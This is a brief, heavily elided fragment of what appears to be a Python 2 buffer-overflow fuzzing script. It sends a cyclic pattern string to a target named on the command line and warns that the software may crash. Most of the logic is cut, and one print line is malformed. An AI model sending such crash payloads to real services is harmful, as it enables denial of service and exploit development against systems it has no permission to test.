...
packes = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4A"
...
try:
  ...
  while True:
    ...
    print "\n[+] Sending + " + str(packes) + "to "%sys.argv[1]
  ...
  print "\n[!] Software could be crashed after sending ... "
